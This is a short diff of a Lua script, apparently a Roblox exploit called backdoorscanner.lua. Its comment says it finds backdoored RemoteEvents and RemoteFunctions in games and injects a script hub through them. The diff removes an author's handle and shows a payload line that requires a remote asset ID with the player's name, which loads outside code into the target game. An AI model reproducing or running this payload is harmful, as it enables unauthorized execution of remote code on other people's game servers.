@@ -1,7 +1,6 @@
 --[[
 backdoorscanner.lua
 This will search for random located RemoteEvents/RemoteFunctions that handles Require Script execution code and inject Kasper's hub into it.
-Bitwise#4908
 ]]
 local RemoteFunctionsEnabled = false -- Change to true if you want to Invoke RemoteFunctions. (Might sometimes work)
 local Code = "require(9039886698).tristytn('" .. game.Players.LocalPlayer.Name .. "')" -- This will load the Kasper's Hub but if you know how to change this feel free to.
